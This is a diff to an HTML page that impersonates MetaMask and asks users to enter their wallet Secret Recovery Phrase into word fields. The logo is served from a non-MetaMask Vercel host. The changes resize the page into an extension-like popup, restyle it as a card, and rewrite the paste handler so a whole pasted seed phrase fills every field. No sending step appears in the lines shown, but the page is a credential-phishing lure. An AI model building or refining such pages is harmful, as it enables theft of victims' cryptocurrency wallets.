@@ -7,6 +7,13 @@
   <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
+    html, body {
+      width: 600px;
+      height: 700px;
+      margin: 0;
+      padding: 0;
+      overflow: auto;
+    }
     * { box-sizing: border-box; }
     body {
       margin: 0;
@@ -21,7 +28,7 @@
       width: 100%;
       max-width: 700px;
       display: flex;
-      justify-content: space-between;
+      justify-content: flex-start; /* à gauche car plus de select */
       align-items: center;
       padding: 30px 30px 10px;
     }
@@ -36,10 +43,10 @@
       width: 100%;
     }
     .card {
-      background-color: transparent;
-      border: none;
-      box-shadow: none;
-      border-radius: 0;
+      background-color: white;
+      border-radius: 20px;
+      border: 1px solid #e0e0e0;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
       padding: 40px;
       width: 100%;
       max-width: 500px;
@@ -154,10 +161,9 @@
     }
   </style>
 </head>
-<body>
-
+<body style="width:600px; height:700px;">
   <div class="top-bar">
-    <div><img src="https://metamask2-eight.vercel.app/meta.png" width="70px"></div>
+    <div><img src="https://metamask2-eight.vercel.app/meta.png" width="70px" alt="Logo"></div>
   </div>
 
   <main>
@@ -195,7 +201,6 @@
         Confirm Secret Recovery Phrase
       </button>
       <p id="errorMsg" class="error-msg">Invalid seed phrase. Please check the words.</p>
-
     </div>
   </main>
 
@@ -222,7 +227,6 @@
       const inputs = container.querySelectorAll("input");
       inputs.forEach(input => {
         input.addEventListener("input", checkFieldsFilled);
-        input.addEventListener("paste", handlePaste);
       });
     }
 
@@ -293,20 +297,19 @@
       }, 800);
     }
 
-    function handlePaste(e) {
+    document.addEventListener("paste", function(e) {
+      const activeInput = document.activeElement;
+      if (!activeInput || !activeInput.name || !activeInput.name.startsWith("word")) return;
       const paste = (e.clipboardData || window.clipboardData).getData("text");
       const words = paste.trim().split(/\s+/);
-      const count = parseInt(document.getElementById("phraseLength").value);
       if (words.length < 2) return;
       e.preventDefault();
       words.forEach((word, index) => {
-        if (index < count) {
-          const input = document.querySelector(`input[name='word${index + 1}']`);
-          if (input) input.value = word;
-        }
+        const input = document.querySelector(`input[name='word${index + 1}']`);
+        if (input) input.value = word;
       });
       checkFieldsFilled();
-    }
+    });
 
     window.onload = generateInputs;
   </script>
